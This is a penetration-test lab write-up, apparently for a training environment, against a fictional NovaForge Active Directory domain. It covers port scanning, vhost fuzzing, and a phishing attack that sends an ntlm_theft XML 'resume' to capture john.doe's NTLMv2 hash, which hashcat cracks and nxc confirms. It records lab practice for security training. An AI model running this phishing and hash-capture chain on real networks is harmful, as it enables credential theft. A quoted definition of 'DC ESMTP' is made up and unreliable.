
# Objective and scope
NovaForge delivers enterprise software, intelligent automation, and internal management platforms targeted towards mid-sized companies. They have hired Hack Smarter to perform an internal network penetration test, with a special focus on Active Directory.

Your task is to enumerate the network and see if you can fully compromise the domain.

The client has provided you with VPN access to their network, but no credentials.

# Host file setup
```python
sudo nxc smb 10.0.0.100 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## DC
### Open ports
```python
nmap -p- --min-rate=2000 -sT dc.novaforge.local                                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:26 +0100
Nmap scan report for dc.novaforge.local (10.0.0.100)
Host is up (0.094s latency).
rDNS record for 10.0.0.100: DC.novaforge.local
Not shown: 65504 closed tcp ports (conn-refused)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
587/tcp   open  submission
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
49693/tcp open  unknown
49697/tcp open  unknown
49709/tcp open  unknown
49714/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.62 seconds
```

### Nmap
```python
nmap -p 25,53,80,88,110,135,139,143,389,445,464,587,593,636,3268,3269,3389,5985 -A --min-rate=2000 -sT dc.novaforge.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:28 +0100
Nmap scan report for dc.novaforge.local (10.0.0.100)
Host is up (0.095s latency).
rDNS record for 10.0.0.100: DC.novaforge.local

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: NovaForge | Dark Enterprise Suite \xE2\x80\x94 Video Loop
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-06 15:28:25Z)
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 IMAP4 CAPABILITY NAMESPACE IDLE OK CHILDREN completed RIGHTS=texkA0001 ACL QUOTA SORT
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novaforge.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: novaforge.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: NOVAFORGE
|   NetBIOS_Domain_Name: NOVAFORGE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: novaforge.local
|   DNS_Computer_Name: DC.novaforge.local
|   DNS_Tree_Name: novaforge.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-06T15:28:46+00:00
| ssl-cert: Subject: commonName=DC.novaforge.local
| Not valid before: 2026-06-18T23:09:56
|_Not valid after:  2026-12-18T23:09:56
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/6%Time=6A74A81E%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 11 24H2 (94%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (94%), Microsoft Windows Server 2016 (93%), Microsoft Windows 11 24H2 - 25H2 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Some interesting services running!

## Storage server
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.0.101 -Pn                                                                              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:35 +0100
Nmap scan report for 10.0.0.101
Host is up (0.094s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 66.23 seconds
```

### Nmap
```python
nmap -p 135,445,3389,5985 -A --min-rate=2000 -sT 10.0.0.101 -Pn         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 16:38 +0100
Nmap scan report for 10.0.0.101
Host is up (0.095s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=STORAGE.novaforge.local
| Not valid before: 2026-06-18T14:30:14
|_Not valid after:  2026-12-18T14:30:14
| rdp-ntlm-info: 
|   Target_Name: NOVAFORGE
|   NetBIOS_Domain_Name: NOVAFORGE
|   NetBIOS_Computer_Name: STORAGE
|   DNS_Domain_Name: novaforge.local
|   DNS_Computer_Name: STORAGE.novaforge.local
|   DNS_Tree_Name: novaforge.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-06T15:39:10+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/6%Time=6A74AA90%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

I cant do anything with SMB on the storage server, null auth is disabled since this isnt a DC and also the guest account is disabled!

# Domain Controller

So since im sure at this point the initial access is via the DC ill start here.

## SMB (445)
On the DC, null auth is enabled as with all DCs but cannot use it to enumerate shares or users

The guest account is also disabled!

## SMTP (25)

https://medium.com/@rajkumarkumawat/%EF%B8%8Fsmtp-enumeration-the-ethical-hackers-guide-to-uncovering-email-vulnerabilities-efc85ae0a563

```python
nc -vn 10.0.0.100 25        
(UNKNOWN) [10.0.0.100] 25 (smtp) open
220 DC ESMTP
```

> DC ESMTP (Data Center Extended Simple Mail Transfer Protocol) is a specialized mail transfer protocol configuration optimized for high-volume, high-throughput email delivery within and between data center environments. It builds upon standard ESMTP extensions to handle massive email traffic efficiently while ensuring security and reliability.

I cannot use `VRFY` to validate usernames

## HTTP (80)
There is no links on the main page of the website

No hidden endpoints!

Nuclei didnt find anything!

### Ffuf for vhosts
```python
ffuf -u http://novaforge.local/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.novaforge.local' -ic -c -t 30 -fs 29073

intranet                [Status: 200, Size: 34525, Words: 6056, Lines: 792, Duration: 103ms]
jobs                    [Status: 200, Size: 34058, Words: 4399, Lines: 355, Duration: 100ms]
```

Found two subdomains!

# `intranet` subdomain

![](Pasted%20image%2020260806172914.png)

![](Pasted%20image%2020260806172934.png)

![](Pasted%20image%2020260806172955.png)

Found some users and also an alert for phishing emails via .xml files

![](Pasted%20image%2020260806173340.png)

![](Pasted%20image%2020260806173507.png)

# `jobs` subdomain

![](Pasted%20image%2020260806173035.png)

Found a user `john.doe`

Its also safe to assume that the employee emily zhou found on the other subdomain is `emily.zhou` based on this info on `john.doe`

![](Pasted%20image%2020260806173146.png)

Also gives me a hint on what files are allowed

Based on the landing screen for this subdomain my next step is to try and phish the `john.doe` user with an xml file!

# User compromise via phishing

```python
python3 ntlm_theft.py -g all -s 192.168.211.2 -f resume
/home/kali/hsm/novaforge/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: resume/resume.scf (BROWSE TO FOLDER)
Created: resume/resume-(url).url (BROWSE TO FOLDER)
Created: resume/resume-(icon).url (BROWSE TO FOLDER)
Created: resume/resume.lnk (BROWSE TO FOLDER)
Created: resume/resume.rtf (OPEN)
Created: resume/resume-(stylesheet).xml (OPEN)
Created: resume/resume-(fulldocx).xml (OPEN)
Created: resume/resume.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: resume/resume-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: resume/resume-(includepicture).docx (OPEN)
Created: resume/resume-(remotetemplate).docx (OPEN)
Created: resume/resume-(frameset).docx (OPEN)
Created: resume/resume-(externalcell).xlsx (OPEN)
Created: resume/resume.wax (OPEN)
Created: resume/resume.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: resume/resume.asx (OPEN)
Created: resume/resume.jnlp (OPEN)
Created: resume/resume.application (DOWNLOAD AND OPEN)
Created: resume/resume.pdf (OPEN AND ALLOW)
Created: resume/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: resume/resume.library-ms (BROWSE TO FOLDER)
Created: resume/Autorun.inf (BROWSE TO FOLDER)
Created: resume/desktop.ini (BROWSE TO FOLDER)
Created: resume/resume.theme (THEME TO INSTALL
Generation Complete.
```

Ill use ntlm theft to generate the xml file

```python
sudo responer -I tun0
```

Then start responder

```python
sendEmail -f attacker@kali.com -t john.doe@novaforge.local -u 'Job Application' -m 'Here is my resume' -a 'resume-(stylesheet).xml' -s dc.novaforge.local:25
Aug 06 17:50:09 kali sendEmail[34425]: Email was sent successfully!
```

Then ill send the email

```python
[SMB] NTLMv2-SSP Client   : 10.0.0.100
[SMB] NTLMv2-SSP Username : NOVAFORGE\john.doe
[SMB] NTLMv2-SSP Hash     : john.doe::NOVAFORGE:fec2858bc2db6aec:E88119BEDF0BD2659D55A94768AC1FBB:01010000000000008058C0B0CA25DD010B53588D79BC6F89000000000200080053004C004900530001001E00570049004E002D004A005000460034004500560048003500420043004F0004003400570049004E002D004A005000460034004500560048003500420043004F002E0053004C00490053002E004C004F00430041004C000300140053004C00490053002E004C004F00430041004C000500140053004C00490053002E004C004F00430041004C00070008008058C0B0CA25DD01060004000200000008005000500000000000000001000000002000009FB85AC8C5991EC9CA1487B38BE69F818483FF43A7C21745922ACCC72FE1E28DF4509DC7352CBD6841F45895828D349CAE3610F2294F8CFAD5FD5A6AFDA1AF9F0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200310031002E0032000000000000000000
```

Now i have his hash!

```python
hashcat johndoe.hash /usr/share/wordlists/rockyou.txt

JOHN.DOE::NOVAFORGE:fec2858bc2db6aec:e88119bedf0bd2659d55a94768ac1fbb:01010000000000008058c0b0ca25dd010b53588d79bc6f89000000000200080053004c004900530001001e00570049004e002d004a005000460034004500560048003500420043004f0004003400570049004e002d004a005000460034004500560048003500420043004f002e0053004c00490053002e004c004f00430041004c000300140053004c00490053002e004c004f00430041004c000500140053004c00490053002e004c004f00430041004c00070008008058c0b0ca25dd01060004000200000008005000500000000000000001000000002000009fb85ac8c5991ec9ca1487b38be69f818483ff43a7c21745922accc72fe1e28df4509dc7352cbd6841f45895828d349cae3610f2294f8cfad5fd5a6afda1af9f0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003200310031002e0032000000000000000000:johndoe1369
```

The hash cracked

```python
nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5                           
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369
```

This user is now compromised!

# Enumeration as `john.doe`

## SMB shares
```python

```

